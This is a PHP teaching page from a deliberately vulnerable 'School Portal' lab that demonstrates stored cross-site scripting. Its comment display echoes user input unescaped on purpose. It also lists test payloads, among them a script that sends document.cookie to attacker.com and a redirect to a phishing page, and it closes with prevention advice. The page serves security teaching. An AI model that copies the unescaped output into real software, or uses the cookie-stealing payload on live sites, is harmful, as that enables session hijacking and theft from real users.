<?php
/**
 * XSS VULNERABLE PAGE - Cross-Site Scripting Demonstration
 * This page demonstrates XSS vulnerability through a comments feature
 */

include '../includes/config.php';

$message = '';
$comments_list = array();

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $name = $_POST['name'] ?? '';
    $email = $_POST['email'] ?? '';
    $comment = $_POST['comment'] ?? '';
    
    // Basic validation
    if (empty($name) || empty($email) || empty($comment)) {
        $message = "❌ All fields are required";
    } elseif (strlen($comment) > 500) {
        $message = "❌ Comment is too long (max 500 characters)";
    } else {
        // ❌ VULNERABLE CODE - No output encoding
        // User input is stored and displayed without any sanitization
        
        $stmt = $conn->prepare("INSERT INTO comments (name, email, message, status) VALUES (?, ?, ?, 'approved')");
        $stmt->bind_param("sss", $name, $email, $comment);
        
        if ($stmt->execute()) {
            $message = "✅ Comment posted successfully! Refresh to see it.";
        } else {
            $message = "❌ Error posting comment";
        }
        $stmt->close();
    }
}

// Fetch all comments
$result = $conn->query("SELECT id, name, email, message, created_at FROM comments WHERE status='approved' ORDER BY created_at DESC");
if ($result) {
    while ($row = $result->fetch_assoc()) {
        $comments_list[] = $row;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Comments (XSS Demo) - School Portal</title>
    <link rel="stylesheet" href="../css/style.css">
</head>
<body>
    <header>
        <h1>💬 Comments & Feedback (XSS VULNERABLE)</h1>
        <p>Cross-Site Scripting (XSS) Vulnerability Demonstration</p>
    </header>

    <nav>
        <a href="../index.html">Home</a>
        <a href="login_vulnerable.php">Login (Vulnerable)</a>
        <a href="login_secure.php">Login (Secure)</a>
        <a href="news_vulnerable.php">News (Vulnerable)</a>
        <a href="articles_secure.php">Articles (Secure)</a>
        <a href="xss_vulnerable.php">Comments (XSS Demo)</a>
    </nav>

    <div class="container">
        <div class="column-2">
            <div>
                <div class="card">
                    <h2>Post a Comment</h2>

                    <div class="vulnerability-box">
                        <strong>⚠️ VULNERABILITY ALERT:</strong><br>
                        This comment section is <strong>VULNERABLE to XSS</strong>. 
                        Comments are displayed without proper sanitization or encoding.
                    </div>

                    <?php if ($message): ?>
                        <div class="alert <?php echo strpos($message, '✅') !== false ? 'alert-success' : 'alert-danger'; ?>">
                            <?php echo $message; ?>
                        </div>
                    <?php endif; ?>

                    <form method="POST">
                        <div class="form-group">
                            <label for="name">Your Name:</label>
                            <input type="text" id="name" name="name" required placeholder="Enter your name">
                        </div>

                        <div class="form-group">
                            <label for="email">Your Email:</label>
                            <input type="email" id="email" name="email" required placeholder="Enter your email">
                        </div>

                        <div class="form-group">
                            <label for="comment">Comment:</label>
                            <textarea id="comment" name="comment" rows="5" required placeholder="Enter your comment or XSS payload"></textarea>
                            <small style="color: #666; margin-top: 0.5rem; display: block;">
                                Try: <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
                            </small>
                        </div>

                        <button type="submit">Post Comment</button>
                    </form>

                    <hr style="margin: 2rem 0; border: none; border-top: 2px solid #ddd;">

                    <h3>XSS Payloads to Test</h3>

                    <div class="vulnerability-box">
                        <strong>🎯 Simple Alert Box:</strong>
                        <div class="code-block">
                            <code>&lt;script&gt;alert('XSS Vulnerability!')&lt;/script&gt;</code>
                        </div>
                    </div>

                    <div class="vulnerability-box">
                        <strong>🎯 Image Tag with Event Handler:</strong>
                        <div class="code-block">
                            <code>&lt;img src=x onerror=alert('XSS')&gt;</code>
                        </div>
                    </div>

                    <div class="vulnerability-box">
                        <strong>🎯 SVG with Event Handler:</strong>
                        <div class="code-block">
                            <code>&lt;svg onload=alert('XSS')&gt;&lt;/svg&gt;</code>
                        </div>
                    </div>

                    <div class="vulnerability-box">
                        <strong>🎯 Steal Session Cookie:</strong>
                        <div class="code-block">
                            <code>&lt;script&gt;fetch('http://attacker.com/steal?cookie='+document.cookie)&lt;/script&gt;</code>
                        </div>
                    </div>

                    <div class="vulnerability-box">
                        <strong>🎯 Redirect to Phishing Page:</strong>
                        <div class="code-block">
                            <code>&lt;script&gt;window.location='http://attacker.com/phishing'&lt;/script&gt;</code>
                        </div>
                    </div>

                </div>
            </div>

            <div>
                <div class="card">
                    <h2>Comments (<?php echo count($comments_list); ?>)</h2>

                    <?php if (!empty($comments_list)): ?>
                        <?php foreach ($comments_list as $comment): ?>
                            <div style="background: #f8f9fa; padding: 1.5rem; margin-bottom: 1rem; border-radius: 5px; border-left: 4px solid #dc3545;">
                                <h4 style="color: #333; margin-bottom: 0.3rem;">
                                    ⚠️ <?php echo $comment['name']; ?>
                                </h4>
                                <small style="color: #999;">
                                    <?php echo $comment['email']; ?> | <?php echo $comment['created_at']; ?>
                                </small>
                                <hr style="margin: 0.5rem 0; border: none; border-top: 1px solid #ddd;">
                                <!-- ❌ VULNERABLE: No htmlspecialchars() or escaping -->
                                <p style="margin-top: 0.5rem; word-break: break-all;">
                                    <?php echo $comment['message']; ?>
                                </p>
                            </div>
                        <?php endforeach; ?>
                    <?php else: ?>
                        <p style="color: #999; text-align: center; padding: 2rem;">
                            No comments yet. Be the first to comment!
                        </p>
                    <?php endif; ?>
                </div>
            </div>
        </div>

        <div class="card" style="margin-top: 2rem;">
            <h3>Understanding XSS (Cross-Site Scripting)</h3>

            <div class="vulnerability-box">
                <strong>What is XSS?</strong>
                <p style="margin-top: 0.5rem;">
                    XSS occurs when an attacker injects malicious JavaScript code into a web page.
                    When other users view the page, the JavaScript executes in their browser.
                </p>
            </div>

            <h3>How This XSS Works</h3>

            <div class="code-block">
                <code>
                    // Vulnerable display code:<br>
                    &lt;p&gt;&lt;?php echo $comment['message']; ?&gt;&lt;/p&gt;<br>
                    <br>
                    // If comment contains: &lt;script&gt;alert('XSS')&lt;/script&gt;<br>
                    // Result: &lt;p&gt;&lt;script&gt;alert('XSS')&lt;/script&gt;&lt;/p&gt;<br>
                    <br>
                    // Browser executes the script! 💥
                </code>
            </div>

            <h3>What Attackers Can Do with XSS</h3>
            <ul style="margin-left: 1.5rem; line-height: 1.8;">
                <li><strong>Steal Session Cookies:</strong> Capture user authentication tokens</li>
                <li><strong>Steal Credentials:</strong> Create fake login forms to harvest passwords</li>
                <li><strong>Deface Website:</strong> Modify page content for all users</li>
                <li><strong>Redirect Users:</strong> Send users to malicious websites</li>
                <li><strong>Keystroke Logging:</strong> Record what users type</li>
                <li><strong>Malware Distribution:</strong> Inject malware or ransomware</li>
                <li><strong>Perform Actions:</strong> Post, delete, or modify data on behalf of users</li>
            </ul>

            <h3>Types of XSS</h3>

            <div class="security-box">
                <strong>1. Stored XSS (Persistent)</strong>
                <p style="margin-top: 0.5rem;">
                    Malicious code is stored in the database and executed for all users.
                    <br><strong>Example:</strong> Comment with JavaScript saved in database.
                </p>
            </div>

            <div class="security-box">
                <strong>2. Reflected XSS (Non-Persistent)</strong>
                <p style="margin-top: 0.5rem;">
                    Malicious code is in the URL and reflected back to the user.
                    <br><strong>Example:</strong> URL parameter displayed on page without escaping.
                </p>
            </div>

            <div class="security-box">
                <strong>3. DOM-based XSS</strong>
                <p style="margin-top: 0.5rem;">
                    JavaScript code on the page manipulates the DOM unsafely.
                    <br><strong>Example:</strong> <code>document.innerHTML = userInput;</code>
                </p>
            </div>

            <h3>How to Prevent XSS</h3>

            <div class="security-box">
                <strong>✅ 1. Output Encoding (HTML Escaping)</strong>
                <div class="code-block">
                    <code>
                        // VULNERABLE:<br>
                        &lt;?php echo $comment['message']; ?&gt;<br>
                        <br>
                        // SECURE:<br>
                        &lt;?php echo htmlspecialchars($comment['message'], ENT_QUOTES, 'UTF-8'); ?&gt;
                    </code>
                </div>
                <p style="margin-top: 0.5rem;">
                    htmlspecialchars() converts special characters to HTML entities:<br>
                    &lt; becomes &amp;lt;  |  &gt; becomes &amp;gt;  |  " becomes &amp;quot;
                </p>
            </div>

            <div class="security-box">
                <strong>✅ 2. Input Validation</strong>
                <div class="code-block">
                    <code>
                        if (!preg_match('/^[a-zA-Z0-9\s.,!?\'-]*$/', $comment)) {<br>
                        &nbsp;&nbsp;die('Invalid comment format');<br>
                        }
                    </code>
                </div>
            </div>

            <div class="security-box">
                <strong>✅ 3. Content Security Policy (CSP)</strong>
                <div class="code-block">
                    <code>
                        header("Content-Security-Policy: default-src 'self'; script-src 'self'");
                    </code>
                </div>
                <p style="margin-top: 0.5rem;">
                    Restricts where scripts can be loaded from, preventing inline JavaScript.
                </p>
            </div>

            <div class="security-box">
                <strong>✅ 4. Never Use innerHTML with User Input</strong>
                <div class="code-block">
                    <code>
                        // VULNERABLE:<br>
                        document.getElementById('content').innerHTML = userInput;<br>
                        <br>
                        // SECURE:<br>
                        document.getElementById('content').textContent = userInput;
                    </code>
                </div>
            </div>
        </div>
    </div>

    <footer>
        <p>&copy; 2026 School Portal - Educational Security Demonstration</p>
    </footer>
</body>
</html>
